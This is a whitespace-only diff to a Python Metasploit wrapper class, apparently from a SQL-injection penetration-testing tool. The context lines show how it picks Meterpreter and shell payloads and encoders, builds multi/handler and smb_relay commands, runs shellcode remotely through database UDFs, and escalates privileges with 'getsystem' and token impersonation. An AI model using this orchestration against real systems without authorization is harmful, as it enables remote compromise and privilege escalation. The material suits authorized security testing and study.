@@ -50,22 +50,22 @@ class Metasploit:
     """
 
     def __initVars(self):
-        self.connectionStr  = None
-        self.lhostStr       = None
-        self.rhostStr       = None
-        self.portStr        = None
-        self.payloadStr     = None
-        self.encoderStr     = None
+        self.connectionStr = None
+        self.lhostStr = None
+        self.rhostStr = None
+        self.portStr = None
+        self.payloadStr = None
+        self.encoderStr = None
         self.payloadConnStr = None
-        self.resourceFile   = None
-        self.localIP        = getLocalIP()
-        self.remoteIP       = getRemoteIP()
-        self.__msfCli       = normalizePath(os.path.join(conf.msfPath, "msfcli"))
-        self.__msfConsole   = normalizePath(os.path.join(conf.msfPath, "msfconsole"))
-        self.__msfEncode    = normalizePath(os.path.join(conf.msfPath, "msfencode"))
-        self.__msfPayload   = normalizePath(os.path.join(conf.msfPath, "msfpayload"))
+        self.resourceFile = None
+        self.localIP = getLocalIP()
+        self.remoteIP = getRemoteIP()
+        self.__msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli"))
+        self.__msfConsole = normalizePath(os.path.join(conf.msfPath, "msfconsole"))
+        self.__msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode"))
+        self.__msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload"))
 
-        self.__msfPayloadsList    = {
+        self.__msfPayloadsList = {
                                       "windows": {
                                                    1: ( "Meterpreter (default)", "windows/meterpreter" ),
                                                    2: ( "Shell", "windows/shell" ),
@@ -88,7 +88,7 @@ class Metasploit:
                                                  }
                                     }
 
-        self.__msfEncodersList    = {
+        self.__msfEncodersList = {
                                       "windows": {
                                                    1: ( "No Encoder", "generic/none" ),
                                                    2: ( "Alpha2 Alphanumeric Mixedcase Encoder", "x86/alpha_mixed" ),
@@ -106,14 +106,14 @@ class Metasploit:
                                                  }
                                     }
 
-        self.__msfSMBPortsList    = {
+        self.__msfSMBPortsList = {
                                       "windows": {
                                                    1: ( "139/TCP", "139" ),
                                                    2: ( "445/TCP (default)", "445" ),
                                                  }
                                     }
 
-        self.__portData           = {
+        self.__portData = {
                                       "bind":    "remote port number",
                                       "reverse": "local port number",
                                     }
@@ -175,7 +175,7 @@ class Metasploit:
 
     def __selectPayload(self):
         if Backend.isOs(OS.WINDOWS) and conf.privEsc:
-            infoMsg  = "forcing Metasploit payload to Meterpreter because "
+            infoMsg = "forcing Metasploit payload to Meterpreter because "
             infoMsg += "it is the only payload that can be used to "
             infoMsg += "escalate privileges, either via 'incognito' "
             infoMsg += "extension or via 'getsystem' command"
@@ -190,7 +190,7 @@ class Metasploit:
             choose = False
 
             if Backend.getIdentifiedDbms() == DBMS.MYSQL:
-                debugMsg  = "by default MySQL on Windows runs as SYSTEM "
+                debugMsg = "by default MySQL on Windows runs as SYSTEM "
                 debugMsg += "user, it is likely that the the VNC "
                 debugMsg += "injection will be successful"
                 logger.debug(debugMsg)
@@ -198,7 +198,7 @@ class Metasploit:
             elif Backend.getIdentifiedDbms() == DBMS.PGSQL:
                 choose = True
 
-                warnMsg  = "by default PostgreSQL on Windows runs as "
+                warnMsg = "by default PostgreSQL on Windows runs as "
                 warnMsg += "postgres user, it is unlikely that the VNC "
                 warnMsg += "injection will be successful"
                 logger.warn(warnMsg)
@@ -206,14 +206,14 @@ class Metasploit:
             elif Backend.getIdentifiedDbms() == DBMS.MSSQL and Backend.isVersionWithin(("2005", "2008")):
                 choose = True
 
-                warnMsg  = "it is unlikely that the VNC injection will be "
+                warnMsg = "it is unlikely that the VNC injection will be "
                 warnMsg += "successful because usually Microsoft SQL Server "
                 warnMsg += "%s runs as Network Service " % Backend.getVersion()
                 warnMsg += "or the Administrator is not logged in"
                 logger.warn(warnMsg)
 
             if choose:
-                message  = "what do you want to do?\n"
+                message = "what do you want to do?\n"
                 message += "[1] Give it a try anyway\n"
                 message += "[2] Fall back to Meterpreter payload (default)\n"
                 message += "[3] Fall back to Shell payload"
@@ -289,12 +289,12 @@ class Metasploit:
         return self.__skeletonSelection("connection type", self.__msfConnectionsList)
 
     def __prepareIngredients(self, encode=True):
-        self.connectionStr  = self.__selectConnection()
-        self.lhostStr       = self.__selectLhost()
-        self.rhostStr       = self.__selectRhost()
-        self.portStr        = self.__selectPort()
-        self.payloadStr     = self.__selectPayload()
-        self.encoderStr     = self.__selectEncoder(encode)
+        self.connectionStr = self.__selectConnection()
+        self.lhostStr = self.__selectLhost()
+        self.rhostStr = self.__selectRhost()
+        self.portStr = self.__selectPort()
+        self.payloadStr = self.__selectPayload()
+        self.encoderStr = self.__selectEncoder(encode)
 
         if self.payloadStr == "linux/x86/shell":
             self.payloadConnStr = "%s_%s" % (self.payloadStr, self.connectionStr)
@@ -302,7 +302,7 @@ class Metasploit:
             self.payloadConnStr = "%s/%s" % (self.payloadStr, self.connectionStr)
 
     def __forgeMsfCliCmd(self, exitfunc="process"):
-        self.__cliCmd  = "%s multi/handler PAYLOAD=%s" % (self.__msfCli, self.payloadConnStr)
+        self.__cliCmd = "%s multi/handler PAYLOAD=%s" % (self.__msfCli, self.payloadConnStr)
         self.__cliCmd += " EXITFUNC=%s" % exitfunc
         self.__cliCmd += " LPORT=%s" % self.portStr
         #self.__cliCmd += " ExitOnSession=true"
@@ -327,7 +327,7 @@ class Metasploit:
 
         self.__prepareIngredients(encode=False)
 
-        self.__resource  = "use windows/smb/smb_relay\n"
+        self.__resource = "use windows/smb/smb_relay\n"
         self.__resource += "set SRVHOST %s\n" % self.lhostStr
         self.__resource += "set SRVPORT %s\n" % self.__selectSMBPort()
         self.__resource += "set PAYLOAD %s\n" % self.payloadConnStr
@@ -348,7 +348,7 @@ class Metasploit:
         self.resourceFp.close()
 
     def __forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
-        self.__payloadCmd  = "%s %s" % (self.__msfPayload, self.payloadConnStr)
+        self.__payloadCmd = "%s %s" % (self.__msfPayload, self.payloadConnStr)
         self.__payloadCmd += " EXITFUNC=%s" % exitfunc
         self.__payloadCmd += " LPORT=%s" % self.portStr
         #self.__payloadCmd += " ExitOnSession=true"
@@ -370,7 +370,7 @@ class Metasploit:
     def __runMsfCli(self, exitfunc):
         self.__forgeMsfCliCmd(exitfunc)
 
-        infoMsg  = "running Metasploit Framework 3 command line "
+        infoMsg = "running Metasploit Framework 3 command line "
         infoMsg += "interface locally, please wait.."
         logger.info(infoMsg)
 
@@ -385,14 +385,14 @@ class Metasploit:
         self.__msfConsoleProc = execute(self.__consoleCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
 
     def __runMsfShellcodeRemote(self):
-        infoMsg  = "running Metasploit Framework 3 shellcode "
+        infoMsg = "running Metasploit Framework 3 shellcode "
         infoMsg += "remotely via UDF 'sys_bineval', please wait.."
         logger.info(infoMsg)
 
         self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
 
     def __runMsfShellcodeRemoteViaSexec(self):
-        infoMsg  = "running Metasploit Framework 3 shellcode remotely "
+        infoMsg = "running Metasploit Framework 3 shellcode remotely "
         infoMsg += "via shellcodeexec, please wait.."
         logger.info(infoMsg)
 
@@ -421,14 +421,14 @@ class Metasploit:
         if conf.privEsc:
             print
 
-            infoMsg  = "trying to escalate privileges using Meterpreter "
+            infoMsg = "trying to escalate privileges using Meterpreter "
             infoMsg += "'getsystem' command which tries different "
             infoMsg += "techniques, including kitrap0d"
             logger.info(infoMsg)
 
             proc.stdin.write("getsystem\n")
 
-            infoMsg  = "displaying the list of Access Tokens availables. "
+            infoMsg = "displaying the list of Access Tokens availables. "
             infoMsg += "Choose which user you want to impersonate by "
             infoMsg += "using incognito's command 'impersonate_token' if "
             infoMsg += "'getsystem' does not success to elevate privileges"
@@ -469,7 +469,7 @@ class Metasploit:
                     blockingWriteToFD(sys.stdout.fileno(), out)
 
                     # For --os-pwn and --os-bof
-                    pwnBofCond  = self.connectionStr.startswith("reverse")
+                    pwnBofCond = self.connectionStr.startswith("reverse")
                     pwnBofCond &= "Starting the payload handler" in out
 
                     # For --os-smbrelay
@@ -574,7 +574,7 @@ class Metasploit:
         if self.connectionStr.startswith("bind"):
             func()
 
-        debugMsg  = "Metasploit Framework 3 command line interface exited "
+        debugMsg = "Metasploit Framework 3 command line interface exited "
         debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, func)
         logger.debug(debugMsg)
 
@@ -596,7 +596,7 @@ class Metasploit:
 
         self.__runMsfConsole()
 
-        debugMsg  = "Metasploit Framework 3 console exited with return "
+        debugMsg = "Metasploit Framework 3 console exited with return "
         debugMsg += "code %s" % self.__controlMsfCmd(self.__msfConsoleProc, self.uncPathRequest)
         logger.debug(debugMsg)
 
@@ -608,6 +608,6 @@ class Metasploit:
         if self.connectionStr.startswith("bind"):
             self.spHeapOverflow()
 
-        debugMsg  = "Metasploit Framework 3 command line interface exited "
+        debugMsg = "Metasploit Framework 3 command line interface exited "
         debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, self.spHeapOverflow)
         logger.debug(debugMsg)
